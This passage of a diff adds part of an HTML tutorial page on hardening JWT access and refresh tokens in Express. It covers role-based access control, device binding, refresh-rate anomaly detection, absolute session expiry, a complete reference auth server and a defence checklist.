+  const token = authHeader.slice(7); // Remove "Bearer " prefix
+
+  try {
+    const claims = jwt.verify(token, ACCESS_SECRET, {
+      issuer:    'api.myapp.com',
+      audience:  'myapp-client',
+      algorithms: ['HS256'],  // prevent algorithm confusion attacks (e.g. RS256 as HS256)
+    });
+
+    // Explicit type check — prevents a refresh token being used as an access token
+    if (claims.type !== 'access') {
+      return res.status(401).json({ error: 'Invalid token type' });
+    }
+
+    req.user = {
+      id:    claims.sub,
+      roles: claims.roles,
+    };
+
+    next();
+  } catch (err) {
+    if (err.name === 'TokenExpiredError') {
+      return res.status(401).json({ error: 'Access token expired', code: 'TOKEN_EXPIRED' });
+    }
+    return res.status(401).json({ error: 'Invalid access token' });
+  }
+}
+
+// Role-based access control on top of auth:
+export function requireRole(...requiredRoles) {
+  return (req, res, next) => {
+    if (!req.user) return res.status(401).json({ error: 'Not authenticated' });
+
+    const hasRole = requiredRoles.some(role => req.user.roles.includes(role));
+    if (!hasRole) {
+      return res.status(403).json({ error: 'Insufficient permissions' });
+    }
+    next();
+  };
+}
+
+// ─── Usage ────────────────────────────────────────────────────────────────────
+
+// All routes require authentication
+app.use('/api', requireAuth);
+
+// Some routes require a specific role
+app.delete('/api/users/:id', requireRole('admin'), async (req, res) => {
+  // Only admins can delete users
+});
+
+app.get('/api/profile', async (req, res) => {
+  // Any authenticated user can read their own profile
+  res.json({ userId: req.user.id });
+});</code></pre>
+      </section>
+
+      <!-- ─── SECTION 9 ─────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 9</span>
+        <h2>Additional hardening: binding, fingerprinting, anomaly detection</h2>
+
+        <p>
+          The patterns above cover the primary attack surface. The following additions raise the
+          bar significantly for sophisticated attackers.
+        </p>
+
+        <p class="mini-heading">Token binding (context locking)</p>
+        <p>
+          Bind the refresh token to device characteristics at issuance. Validate them on every use.
+          A stolen token used from a different device or browser will mismatch.
+        </p>
+
+        <pre><code class="language-js">// ─── Bind refresh token to device fingerprint ─────────────────────────────────
+
+app.post('/auth/login', async (req, res) => {
+  const user = await validateCredentials(req.body.email, req.body.password);
+
+  const fingerprint = {
+    userAgent: req.headers['user-agent'],
+    ip:        req.ip,
+    // In production: also store a client-generated device ID
+    // that the frontend sends in a custom header
+  };
+
+  await db.refreshTokens.create({
+    userId:      user.id,
+    tokenHash:   hashToken(refreshToken),
+    family:      generateFamily(),
+    userAgent:   fingerprint.userAgent,
+    ipAddress:   fingerprint.ip,
+    expiresAt:   ...,
+  });
+  // ...
+});
+
+app.post('/auth/refresh', async (req, res) => {
+  // ...after finding the stored token...
+
+  // Soft binding: log mismatches as suspicious (don't block — IP can change on mobile)
+  if (stored.userAgent !== req.headers['user-agent']) {
+    console.warn(`User-agent mismatch on refresh. User: ${claims.sub}`);
+    // Trigger MFA challenge or notify user
+  }
+
+  // Hard binding: block if device ID doesn't match (requires client cooperation)
+  const deviceId = req.headers['x-device-id'];
+  if (stored.deviceId && stored.deviceId !== deviceId) {
+    await db.refreshTokens.deleteAll({ family: claims.family });
+    return res.status(401).json({ error: 'Device mismatch. Session terminated.' });
+  }
+});</code></pre>
+
+        <p class="mini-heading">Refresh rate anomaly detection</p>
+        <p>
+          A legitimate session refreshes at most every 15 minutes (one per access-token expiry).
+          An attacker who stole a refresh token may refresh much more aggressively.
+        </p>
+
+        <pre><code class="language-js">// ─── Detect abnormal refresh rate ────────────────────────────────────────────
+
+app.post('/auth/refresh', async (req, res) => {
+  // ...after finding stored token...
+
+  const REFRESH_RATE_LIMIT = 3;    // max refreshes within the window
+  const RATE_WINDOW_MS     = 5 * 60 * 1000; // 5 minutes
+
+  // Count recent refreshes for this user across all their families
+  const recentCount = await db.refreshTokens.countRecentRefreshes({
+    userId:  claims.sub,
+    since:   new Date(Date.now() - RATE_WINDOW_MS),
+  });
+
+  if (recentCount > REFRESH_RATE_LIMIT) {
+    console.warn(`Abnormal refresh rate. User: ${claims.sub}, count: ${recentCount}`);
+    // Options: require MFA, rate-limit with 429, or alert security team
+    return res.status(429).json({ error: 'Too many token refreshes. Please re-authenticate.' });
+  }
+
+  // Proceed with normal rotation...
+});</code></pre>
+
+        <p class="mini-heading">Absolute refresh token expiry</p>
+        <p>
+          Even with rotation, set a hard maximum session length. After 90 days (or your policy),
+          force re-authentication regardless of activity. This limits damage from tokens stolen
+          very early in a long session.
+        </p>
+
+        <pre><code class="language-js">// ─── Enforce absolute session expiry ─────────────────────────────────────────
+
+app.post('/auth/login', async (req, res) => {
+  // Store absolute session creation time in the first refresh token of the family
+  await db.refreshTokens.create({
+    ...
+    sessionStartedAt: new Date(),  // immutable — copied forward on rotation
+  });
+});
+
+app.post('/auth/refresh', async (req, res) => {
+  const MAX_SESSION_DURATION_MS = 90 * 24 * 60 * 60 * 1000; // 90 days
+
+  if (Date.now() - stored.sessionStartedAt > MAX_SESSION_DURATION_MS) {
+    // This family is too old. Force re-authentication.
+    await db.refreshTokens.deleteAll({ family: claims.family });
+    return res.status(401).json({
+      error:  'Session expired. Please log in again.',
+      code:   'SESSION_MAX_AGE_EXCEEDED',
+    });
+  }
+
+  // On rotation, copy sessionStartedAt to the new token record
+  await db.refreshTokens.create({
+    ...
+    sessionStartedAt: stored.sessionStartedAt, // preserve original start time
+  });
+});</code></pre>
+      </section>
+
+      <!-- ─── SECTION 10 ────────────────────────────────────────────────────── -->
+      <section class="content-card">
+        <span class="section-label">Section 10</span>
+        <h2>Complete picture: the full auth server</h2>
+
+        <p>
+          Putting all the patterns together into a minimal but production-grade auth server:
+        </p>
+
+        <pre><code class="language-js">// ─── auth-server.js — complete reference implementation ──────────────────────
+
+import express      from 'express';
+import cookieParser from 'cookie-parser';
+import helmet       from 'helmet';
+import jwt          from 'jsonwebtoken';
+import crypto       from 'crypto';
+
+const app = express();
+app.use(helmet());
+app.use(express.json());
+app.use(cookieParser());
+
+const ACCESS_SECRET  = process.env.ACCESS_TOKEN_SECRET;
+const REFRESH_SECRET = process.env.REFRESH_TOKEN_SECRET;
+
+// ─── Helpers ──────────────────────────────────────────────────────────────────
+
+const hash = (s) => crypto.createHash('sha256').update(s).digest('hex');
+
+function issueAccessToken(userId, roles) {
+  return jwt.sign(
+    { sub: userId, roles, type: 'access', iss: 'api.myapp.com', aud: 'myapp-client' },
+    ACCESS_SECRET, { expiresIn: '15m', algorithm: 'HS256' }
+  );
+}
+
+function issueRefreshToken(userId, family) {
+  return jwt.sign(
+    { sub: userId, type: 'refresh', family },
+    REFRESH_SECRET, { expiresIn: '30d', algorithm: 'HS256' }
+  );
+}
+
+const COOKIE_OPTS = {
+  httpOnly: true, secure: true, sameSite: 'strict',
+  path: '/auth/refresh', maxAge: 30 * 24 * 60 * 60 * 1000,
+};
+
+// ─── POST /auth/login ─────────────────────────────────────────────────────────
+
+app.post('/auth/login', async (req, res) => {
+  const user = await db.users.validateCredentials(req.body.email, req.body.password);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  const family       = crypto.randomUUID();
+  const accessToken  = issueAccessToken(user.id, user.roles);
+  const refreshToken = issueRefreshToken(user.id, family);
+
+  await db.refreshTokens.create({
+    userId:          user.id, roles: user.roles,
+    tokenHash:       hash(refreshToken), family,
+    sessionStartedAt: new Date(),
+    expiresAt:       new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+    userAgent:       req.headers['user-agent'], ipAddress: req.ip,
+  });
+
+  res.cookie('refresh_token', refreshToken, COOKIE_OPTS);
+  res.json({ accessToken });
+});
+
+// ─── POST /auth/refresh ───────────────────────────────────────────────────────
+
+app.post('/auth/refresh', async (req, res) => {
+  const incoming = req.cookies.refresh_token;
+  if (!incoming) return res.status(401).json({ error: 'No refresh token' });
+
+  let claims;
+  try { claims = jwt.verify(incoming, REFRESH_SECRET); }
+  catch { return res.status(401).json({ error: 'Invalid token' }); }
+
+  if (claims.type !== 'refresh') return res.status(401).json({ error: 'Wrong token type' });
+
+  const stored = await db.refreshTokens.findOne({ tokenHash: hash(incoming) });
+
+  if (!stored) {
+    // Reuse detected — kill the whole family
+    await db.refreshTokens.deleteAll({ family: claims.family });
+    await notifyUser(claims.sub, 'suspicious_activity');
+    return res.status(401).json({ error: 'Token reuse detected. All sessions terminated.' });
+  }
+
+  // Absolute session age check
+  if (Date.now() - stored.sessionStartedAt > 90 * 24 * 60 * 60 * 1000) {
+    await db.refreshTokens.deleteAll({ family: claims.family });
+    return res.status(401).json({ error: 'Session expired. Please log in again.' });
+  }
+
+  // Issue new tokens (rotation)
+  const newAccess  = issueAccessToken(claims.sub, stored.roles);
+  const newRefresh = issueRefreshToken(claims.sub, claims.family);
+
+  await db.refreshTokens.delete({ tokenHash: hash(incoming) });
+  await db.refreshTokens.create({
+    userId: claims.sub, roles: stored.roles,
+    tokenHash: hash(newRefresh), family: claims.family,
+    sessionStartedAt: stored.sessionStartedAt, // preserve
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+    userAgent: req.headers['user-agent'], ipAddress: req.ip,
+  });
+
+  res.cookie('refresh_token', newRefresh, COOKIE_OPTS);
+  res.json({ accessToken: newAccess });
+});
+
+// ─── POST /auth/logout ────────────────────────────────────────────────────────
+
+app.post('/auth/logout', async (req, res) => {
+  const token = req.cookies.refresh_token;
+  if (token) {
+    try {
+      const claims = jwt.verify(token, REFRESH_SECRET);
+      await db.refreshTokens.delete({ tokenHash: hash(token) });
+    } catch { /* already expired — still clear the cookie */ }
+  }
+  res.clearCookie('refresh_token', { ...COOKIE_OPTS });
+  res.json({ message: 'Logged out' });
+});
+
+app.listen(3000);</code></pre>
+      </section>
+
+      <!-- ─── DEFENCE CHECKLIST ─────────────────────────────────────────────── -->
+      <section class="content-card">
+        <h2>Defence checklist</h2>
+        <ul class="check-list">
+          <li><strong>Different secrets</strong> for access and refresh tokens.</li>
+          <li><strong>Explicit <code>type</code> claim</strong> validated on every verification.</li>
+          <li><strong>Short-lived access tokens</strong> (15 minutes or less).</li>
+          <li><strong>Access tokens in memory only</strong> — never localStorage or sessionStorage.</li>
+          <li><strong>Refresh tokens in HTTP-only, Secure, SameSite=Strict cookies</strong>, scoped to <code>/auth/refresh</code> path only.</li>
+          <li><strong>Refresh tokens stored as SHA-256 hashes</strong> in the database — never the raw token.</li>
+          <li><strong>Token rotation on every use</strong> — old token deleted, new token issued atomically.</li>
+          <li><strong>Token families</strong> — reuse of a consumed token kills the entire family immediately.</li>
+          <li><strong>User notification</strong> on detected reuse — email/push "suspicious activity".</li>
+          <li><strong>HTTPS everywhere</strong> with HSTS headers.</li>
+          <li><strong>Bearer tokens in Authorization header</strong> — never in URL query parameters.</li>
+          <li><strong>Algorithm explicitly locked</strong> on <code>jwt.verify</code> — prevent algorithm confusion attacks.</li>
+          <li><strong>Absolute session expiry</strong> (e.g. 90 days) regardless of activity.</li>
+          <li><strong>Refresh rate limiting</strong> — alert or block on abnormal refresh cadence.</li>
+          <li><strong>Revocation endpoints</strong> — logout deletes from DB; admin can force-logout any user.</li>
+          <li><strong>Periodic cleanup</strong> of expired tokens from the database.</li>
+        </ul>
+      </section>
+
+      <!-- ─── TAKEAWAY ──────────────────────────────────────────────────────── -->
+      <section class="content-card takeaways">
+        <h2>Key takeaway</h2>
+        <p>
+          The two-token architecture is not bureaucracy — it is a carefully tuned tradeoff.
+          Access tokens are deliberately disposable: short-lived, stateless, and accepted everywhere.
+          Refresh tokens are deliberately precious: long-lived, stateful, and accepted only at one
+          endpoint. The asymmetry between them is what makes the whole system work.
+        </p>
+        <p>
+          The strongest single investment is <strong>refresh token rotation with families</strong>.
+          It turns a stolen refresh token from a silent, indefinite compromise into a detectable,
+          self-terminating incident. Without it, a stolen refresh token is essentially a skeleton
+          key. With it, the attacker gets one use before the session dies — and you know it happened.
+        </p>
+      </section>
+
+    </main>
+  </body>
+</html>
